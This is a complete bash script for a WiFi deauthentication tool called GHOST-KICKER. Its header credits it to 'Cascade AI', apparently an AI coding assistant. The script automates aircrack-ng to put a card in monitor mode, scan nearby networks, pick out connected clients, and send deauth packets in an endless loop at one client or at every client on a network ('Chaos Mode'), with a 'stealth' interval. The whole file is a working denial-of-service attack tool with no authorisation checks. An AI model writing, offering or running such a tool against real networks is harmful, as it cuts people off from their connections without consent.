#!/bin/bash

################################################################################
# GHOST-KICKER v1.0 - Professional WiFi Deauthentication Tool
# Author: Cascade AI
# Platform: Linux/Termux (Rooted)
# Dependencies: aircrack-ng suite
################################################################################

# ANSI Color Codes for Professional UI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Global Variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEMP_DIR="/tmp/ghost-kicker"
SCAN_LOG="$TEMP_DIR/scan_results.log"
CSV_FILE="$TEMP_DIR/airodump-01.csv"
MONITOR_INTERFACE=""
ORIGINAL_INTERFACE=""
SMART_INTERVAL=2  # Default smart interval in seconds (stealth mode)

################################################################################
# FUNCTION: cleanup_handler
# DESCRIPTION: Handles SIGINT (Ctrl+C) to gracefully restore network state
# PARAMETERS: None
# RETURNS: None
################################################################################
cleanup_handler() {
    echo -e "\n${YELLOW}[!] Interrupt detected. Cleaning up...${NC}"
    
    # Kill any running airodump-ng processes
    killall airodump-ng 2>/dev/null
    
    # Kill any running aireplay-ng processes
    killall aireplay-ng 2>/dev/null
    
    # Restore monitor mode to managed mode if interface was changed
    if [ -n "$MONITOR_INTERFACE" ]; then
        echo -e "${YELLOW}[+] Disabling monitor mode on $MONITOR_INTERFACE...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    
    # Restart NetworkManager (Linux) or wpa_supplicant (Termux)
    if command -v NetworkManager &>/dev/null; then
        echo -e "${YELLOW}[+] Restarting NetworkManager...${NC}"
        systemctl restart NetworkManager 2>/dev/null
    elif command -v wpa_supplicant &>/dev/null; then
        echo -e "${YELLOW}[+] Restarting wpa_supplicant...${NC}"
        systemctl restart wpa_supplicant 2>/dev/null
    fi
    
    echo -e "${GREEN}[✓] Cleanup complete. Network restored.${NC}"
    exit 0
}

# Set trap for SIGINT (Ctrl+C)
trap cleanup_handler SIGINT

################################################################################
# FUNCTION: print_banner
# DESCRIPTION: Displays the tool banner with ASCII art
# PARAMETERS: None
# RETURNS: None
################################################################################
print_banner() {
    clear
    echo -e "${MAGENTA}"
    cat << "EOF"
    ███████╗██╗   ██╗███╗   ██╗ ██████╗ ██╗    ██╗
    ██╔════╝██║   ██║████╗  ██║██╔═══██╗██║    ██║
    █████╗  ██║   ██║██╔██╗ ██║██║   ██║██║ █╗ ██║
    ██╔══╝  ██║   ██║██║╚██╗██║██║   ██║██║███╗██║
    ██║     ╚██████╔╝██║ ╚████║╚██████╔╝╚███╔███╔╝
    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝ 
EOF
    echo -e "                    ${CYAN}KICKER v1.0${NC}"
    echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Professional WiFi Deauthentication Tool for Linux/Termux${NC}"
    echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
    echo ""
}

################################################################################
# FUNCTION: check_root
# DESCRIPTION: Verifies script is running with root privileges
# PARAMETERS: None
# RETURNS: 0 if root, 1 if not root
################################################################################
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[✗] Error: This script must be run as root!${NC}"
        echo -e "${YELLOW}[i] Run with: sudo $0${NC}"
        return 1
    fi
    echo -e "${GREEN}[✓] Root privileges confirmed.${NC}"
    return 0
}

################################################################################
# FUNCTION: check_dependencies
# DESCRIPTION: Checks if aircrack-ng suite is installed
# PARAMETERS: None
# RETURNS: 0 if installed, prompts install if not
################################################################################
check_dependencies() {
    if ! command -v aircrack-ng &>/dev/null; then
        echo -e "${RED}[✗] Error: aircrack-ng suite not found!${NC}"
        echo ""
        echo -e "${YELLOW}[i] Install aircrack-ng:${NC}"
        echo -e "${CYAN}  For Ubuntu/Debian:${NC}"
        echo -e "    sudo apt update && sudo apt install -y aircrack-ng"
        echo -e "${CYAN}  For Termux:${NC}"
        echo -e "    pkg install aircrack-ng"
        echo -e "${CYAN}  For Arch Linux:${NC}"
        echo -e "    sudo pacman -S aircrack-ng"
        echo ""
        return 1
    fi
    echo -e "${GREEN}[✓] aircrack-ng suite found.${NC}"
    return 0
}

################################################################################
# FUNCTION: create_temp_dir
# DESCRIPTION: Creates temporary directory for scan logs
# PARAMETERS: None
# RETURNS: None
################################################################################
create_temp_dir() {
    if [ ! -d "$TEMP_DIR" ]; then
        mkdir -p "$TEMP_DIR"
        echo -e "${GREEN}[✓] Temporary directory created: $TEMP_DIR${NC}"
    fi
}

################################################################################
# FUNCTION: detect_interface
# DESCRIPTION: Auto-detects wireless interface (wlan0, wlan1, etc.)
# PARAMETERS: None
# RETURNS: Interface name or empty string if not found
################################################################################
detect_interface() {
    echo -e "${CYAN}[?] Detecting wireless interface...${NC}"
    
    # Try common interface names
    for iface in wlan0 wlan1 wlp0s3 wlp2s0 wifi0; do
        if ip link show "$iface" &>/dev/null; then
            echo -e "${GREEN}[✓] Wireless interface found: $iface${NC}"
            ORIGINAL_INTERFACE="$iface"
            echo "$iface"
            return 0
        fi
    done
    
    # Fallback: search for any wireless interface
    local iface=$(iwconfig 2>/dev/null | grep -E "^[a-z]" | awk '{print $1}' | head -n1)
    if [ -n "$iface" ]; then
        echo -e "${GREEN}[✓] Wireless interface found: $iface${NC}"
        ORIGINAL_INTERFACE="$iface"
        echo "$iface"
        return 0
    fi
    
    echo -e "${RED}[✗] No wireless interface found!${NC}"
    echo ""
    return 1
}

################################################################################
# FUNCTION: enable_monitor_mode
# DESCRIPTION: Enables monitor mode on the wireless interface
# PARAMETERS: None
# RETURNS: 0 on success, 1 on failure
################################################################################
enable_monitor_mode() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}              ENABLE MONITOR MODE${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Kill interfering processes
    echo -e "${YELLOW}[+] Killing interfering processes...${NC}"
    airmon-ng check kill >/dev/null 2>&1
    
    # Detect interface
    local iface=$(detect_interface)
    if [ -z "$iface" ]; then
        echo -e "${RED}[✗] Failed to detect wireless interface.${NC}"
        return 1
    fi
    
    # Start monitor mode
    echo -e "${YELLOW}[+] Enabling monitor mode on $iface...${NC}"
    local mon_output=$(airmon-ng start "$iface" 2>&1)
    
    # Extract monitor interface name
    MONITOR_INTERFACE=$(echo "$mon_output" | grep -oP "monitor mode enabled on \K\w+")
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        MONITOR_INTERFACE="${iface}mon"
    fi
    
    if ip link show "$MONITOR_INTERFACE" &>/dev/null; then
        echo -e "${GREEN}[✓] Monitor mode enabled: $MONITOR_INTERFACE${NC}"
        return 0
    else
        echo -e "${RED}[✗] Failed to enable monitor mode.${NC}"
        return 1
    fi
}

################################################################################
# FUNCTION: disable_monitor_mode
# DESCRIPTION: Disables monitor mode and restores managed mode
# PARAMETERS: None
# RETURNS: 0 on success
################################################################################
disable_monitor_mode() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}            DISABLE MONITOR MODE & EXIT${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ -n "$MONITOR_INTERFACE" ]; then
        echo -e "${YELLOW}[+] Stopping monitor mode on $MONITOR_INTERFACE...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    
    # Restart network services
    echo -e "${YELLOW}[+] Restarting network services...${NC}"
    if command -v NetworkManager &>/dev/null; then
        systemctl restart NetworkManager 2>/dev/null
    elif command -v wpa_supplicant &>/dev/null; then
        systemctl restart wpa_supplicant 2>/dev/null
    fi
    
    echo -e "${GREEN}[✓] Monitor mode disabled. Network restored.${NC}"
    echo -e "${GREEN}[✓] GHOST-KICKER exiting...${NC}"
    exit 0
}

################################################################################
# FUNCTION: scan_networks
# DESCRIPTION: Scans for WiFi networks using airodump-ng
# PARAMETERS: None
# RETURNS: 0 on success
################################################################################
scan_networks() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}                  SCAN NETWORKS${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[✗] Monitor mode not enabled! Please enable monitor mode first.${NC}"
        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
        return 1
    fi
    
    create_temp_dir
    
    echo -e "${YELLOW}[+] Starting network scan on $MONITOR_INTERFACE...${NC}"
    echo -e "${YELLOW}[i] Press Ctrl+C when you see your target network${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Run airodump-ng and save to CSV
    airodump-ng -w "$TEMP_DIR/airodump" --output-format csv "$MONITOR_INTERFACE"
    
    echo ""
    echo -e "${GREEN}[✓] Scan completed.${NC}"
    echo -e "${YELLOW}[i] Results saved to: $CSV_FILE${NC}"
    
    # Save results to log for easy copy-paste
    if [ -f "$CSV_FILE" ]; then
        echo -e "${YELLOW}[+] Saving scan results to log file...${NC}"
        cp "$CSV_FILE" "$SCAN_LOG"
        echo -e "${GREEN}[✓] Scan log saved to: $SCAN_LOG${NC}"
    fi
    
    read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
}

################################################################################
# FUNCTION: parse_csv_clients
# DESCRIPTION: Parses airodump-ng CSV file and lists connected clients
# PARAMETERS: None
# RETURNS: 0 on success, 1 if no CSV file found
################################################################################
parse_csv_clients() {
    if [ ! -f "$CSV_FILE" ]; then
        echo -e "${RED}[✗] No scan results found! Please scan networks first.${NC}"
        return 1
    fi
    
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}              AUTO-TARGET CLIENT SELECTOR${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Parse CSV and extract client stations (lines starting with "Station MAC")
    local clients_found=0
    local current_bssid=""
    local current_essid=""
    
    while IFS=',' read -r field1 field2 field3 field4 field5 field6 field7 field8 field9 field10 field11 field12 field13 field14 rest; do
        # Check if this is a BSSID line (AP)
        if [[ "$field1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [ "$field2" != "Station MAC" ]; then
            current_bssid="$field1"
            current_essid="$field14"
            if [ -z "$current_essid" ]; then
                current_essid="Hidden Network"
            fi
            echo -e "${GREEN}[AP] $current_essid${NC}"
            echo -e "${CYAN}    BSSID: $current_bssid${NC}"
            echo ""
        fi
        
        # Check if this is a Station line (client)
        if [ "$field1" = "Station MAC" ]; then
            continue
        fi
        
        if [[ "$field1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [ -n "$current_bssid" ]; then
            # This is a client MAC
            clients_found=$((clients_found + 1))
            echo -e "${YELLOW}  [$clients_found] Client MAC: $field1${NC}"
            echo -e "${CYAN}      Connected to: $current_bssid ($current_essid)${NC}"
            echo ""
            
            # Save to temp file for selection
            echo "$clients_found|$field1|$current_bssid|$current_essid" >> "$TEMP_DIR/clients.txt"
        fi
    done < "$CSV_FILE"
    
    if [ $clients_found -eq 0 ]; then
        echo -e "${RED}[✗] No clients found in scan results.${NC}"
        echo -e "${YELLOW}[i] Make sure clients are connected to the network during scan.${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[✓] Found $clients_found client(s).${NC}"
    return 0
}

################################################################################
# FUNCTION: target_specific_attack
# DESCRIPTION: Performs targeted deauth attack on specific client
# PARAMETERS: None
# RETURNS: 0 on success
################################################################################
target_specific_attack() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}              TARGET SPECIFIC ATTACK${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[✗] Monitor mode not enabled!${NC}"
        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
        return 1
    fi
    
    echo -e "${YELLOW}[?] Choose input method:${NC}"
    echo -e "${CYAN}  [1] Manual Input (Type MAC addresses)${NC}"
    echo -e "${CYAN}  [2] Auto-Target (Select from scan results)${NC}"
    echo ""
    read -p "$(echo -e ${GREEN}"[>] Select option: "${NC})" choice
    
    local target_bssid=""
    local client_mac=""
    
    case $choice in
        1)
            # Manual input
            echo ""
            read -p "$(echo -e ${YELLOW}"[>] Enter Target BSSID (AP MAC): "${NC})" target_bssid
            read -p "$(echo -e ${YELLOW}"[>] Enter Client MAC to deauth: "${NC})" client_mac
            ;;
        2)
            # Auto-target from CSV
            if ! parse_csv_clients; then
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi
            
            echo ""
            read -p "$(echo -e ${YELLOW}"[>] Enter client number to attack: "${NC})" client_num
            
            if [ ! -f "$TEMP_DIR/clients.txt" ]; then
                echo -e "${RED}[✗] Client list not found.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi
            
            local selected_client=$(grep "^$client_num|" "$TEMP_DIR/clients.txt")
            if [ -z "$selected_client" ]; then
                echo -e "${RED}[✗] Invalid client number.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi
            
            client_mac=$(echo "$selected_client" | cut -d'|' -f2)
            target_bssid=$(echo "$selected_client" | cut -d'|' -f3)
            local target_essid=$(echo "$selected_client" | cut -d'|' -f4)
            
            echo ""
            echo -e "${GREEN}[✓] Target selected:${NC}"
            echo -e "${CYAN}    Client: $client_mac${NC}"
            echo -e "${CYAN}    AP: $target_bssid${NC}"
            echo -e "${CYAN}    Network: $target_essid${NC}"
            ;;
        *)
            echo -e "${RED}[✗] Invalid option.${NC}"
            read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
            return 1
            ;;
    esac
    
    echo ""
    echo -e "${YELLOW}[?] Configure attack settings:${NC}"
    read -p "$(echo -e ${YELLOW}"[>] Smart Interval (seconds, default=$SMART_INTERVAL): "${NC})" interval
    if [ -n "$interval" ] && [ "$interval" -gt 0 ]; then
        SMART_INTERVAL=$interval
    fi
    
    echo ""
    echo -e "${RED}[!] Starting deauthentication attack...${NC}"
    echo -e "${YELLOW}[i] Smart Interval: ${SMART_INTERVAL}s (stealth mode)${NC}"
    echo -e "${YELLOW}[i] Press Ctrl+C to stop the attack${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Run deauth attack with smart interval
    while true; do
        aireplay-ng -0 5 -a "$target_bssid" -c "$client_mac" "$MONITOR_INTERFACE" 2>/dev/null
        echo -e "${RED}[*] Deauth packets sent to $client_mac${NC}"
        sleep $SMART_INTERVAL
    done
}

################################################################################
# FUNCTION: chaos_mode
# DESCRIPTION: Deauthenticates all clients on a specific network
# PARAMETERS: None
# RETURNS: 0 on success
################################################################################
chaos_mode() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}                   CHAOS MODE${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${RED}[⚠]  WARNING: This will deauth ALL clients on the network!${NC}"
    echo ""
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[✗] Monitor mode not enabled!${NC}"
        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
        return 1
    fi
    
    echo -e "${YELLOW}[?] Choose input method:${NC}"
    echo -e "${CYAN}  [1] Manual Input (Type BSSID)${NC}"
    echo -e "${CYAN}  [2] Auto-Target (Select from scan results)${NC}"
    echo ""
    read -p "$(echo -e ${GREEN}"[>] Select option: "${NC})" choice
    
    local target_bssid=""
    
    case $choice in
        1)
            echo ""
            read -p "$(echo -e ${YELLOW}"[>] Enter Target BSSID (AP MAC): "${NC})" target_bssid
            ;;
        2)
            if [ ! -f "$CSV_FILE" ]; then
                echo -e "${RED}[✗] No scan results found! Please scan networks first.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi
            
            echo ""
            echo -e "${CYAN}Available Networks:${NC}"
            echo ""
            
            local ap_count=0
            while IFS=',' read -r field1 field2 field3 field4 field5 field6 field7 field8 field9 field10 field11 field12 field13 field14 rest; do
                if [[ "$field1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [ "$field2" != "Station MAC" ]; then
                    ap_count=$((ap_count + 1))
                    local essid="$field14"
                    if [ -z "$essid" ]; then
                        essid="Hidden Network"
                    fi
                    echo -e "${GREEN}  [$ap_count] $essid${NC}"
                    echo -e "${CYAN}      BSSID: $field1${NC}"
                    echo ""
                    echo "$ap_count|$field1|$essid" >> "$TEMP_DIR/aps.txt"
                fi
            done < "$CSV_FILE"
            
            if [ $ap_count -eq 0 ]; then
                echo -e "${RED}[✗] No networks found in scan results.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi
            
            read -p "$(echo -e ${YELLOW}"[>] Enter network number: "${NC})" ap_num
            
            if [ ! -f "$TEMP_DIR/aps.txt" ]; then
                echo -e "${RED}[✗] Network list not found.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi
            
            local selected_ap=$(grep "^$ap_num|" "$TEMP_DIR/aps.txt")
            if [ -z "$selected_ap" ]; then
                echo -e "${RED}[✗] Invalid network number.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi
            
            target_bssid=$(echo "$selected_ap" | cut -d'|' -f2)
            local target_essid=$(echo "$selected_ap" | cut -d'|' -f3)
            
            echo ""
            echo -e "${GREEN}[✓] Target selected: $target_essid ($target_bssid)${NC}"
            ;;
        *)
            echo -e "${RED}[✗] Invalid option.${NC}"
            read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
            return 1
            ;;
    esac
    
    echo ""
    echo -e "${YELLOW}[?] Configure attack settings:${NC}"
    read -p "$(echo -e ${YELLOW}"[>] Smart Interval (seconds, default=$SMART_INTERVAL): "${NC})" interval
    if [ -n "$interval" ] && [ "$interval" -gt 0 ]; then
        SMART_INTERVAL=$interval
    fi
    
    echo ""
    echo -e "${RED}[!] CHAOS MODE ACTIVATED!${NC}"
    echo -e "${RED}[!] Deauthenticating ALL clients on $target_bssid${NC}"
    echo -e "${YELLOW}[i] Smart Interval: ${SMART_INTERVAL}s (stealth mode)${NC}"
    echo -e "${YELLOW}[i] Press Ctrl+C to stop the attack${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Run broadcast deauth attack with smart interval
    while true; do
        aireplay-ng -0 5 -a "$target_bssid" "$MONITOR_INTERFACE" 2>/dev/null
        echo -e "${RED}[*] Broadcast deauth packets sent to $target_bssid${NC}"
        sleep $SMART_INTERVAL
    done
}

################################################################################
# FUNCTION: show_menu
# DESCRIPTION: Displays the main menu and handles user input
# PARAMETERS: None
# RETURNS: None (exits on option 5)
################################################################################
show_menu() {
    while true; do
        print_banner
        echo -e "${BOLD}${GREEN}                    MAIN MENU${NC}"
        echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}  [1]${NC} ${GREEN}Enable Monitor Mode${NC}"
        echo -e "${CYAN}  [2]${NC} ${GREEN}Scan Networks${NC}"
        echo -e "${CYAN}  [3]${NC} ${GREEN}Target Specific Attack${NC}"
        echo -e "${CYAN}  [4]${NC} ${RED}Chaos Mode (Deauth All Clients)${NC}"
        echo -e "${CYAN}  [5]${NC} ${YELLOW}Disable Monitor Mode & Exit${NC}"
        echo ""
        echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
        echo ""
        
        # Show current status
        if [ -n "$MONITOR_INTERFACE" ]; then
            echo -e "${GREEN}[✓] Monitor Mode: $MONITOR_INTERFACE${NC}"
        else
            echo -e "${RED}[✗] Monitor Mode: Disabled${NC}"
        fi
        echo ""
        
        read -p "$(echo -e ${BOLD}${GREEN}"[?] Select option: "${NC})" choice
        
        case $choice in
            1)
                enable_monitor_mode
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                ;;
            2)
                scan_networks
                ;;
            3)
                target_specific_attack
                ;;
            4)
                chaos_mode
                ;;
            5)
                disable_monitor_mode
                ;;
            *)
                echo -e "${RED}[✗] Invalid option. Please try again.${NC}"
                sleep 2
                ;;
        esac
    done
}

################################################################################
# MAIN EXECUTION
################################################################################
main() {
    # Check root privileges
    if ! check_root; then
        exit 1
    fi
    
    # Check dependencies
    if ! check_dependencies; then
        exit 1
    fi
    
    # Create temp directory
    create_temp_dir
    
    # Show main menu
    show_menu
}

# Run main function
main
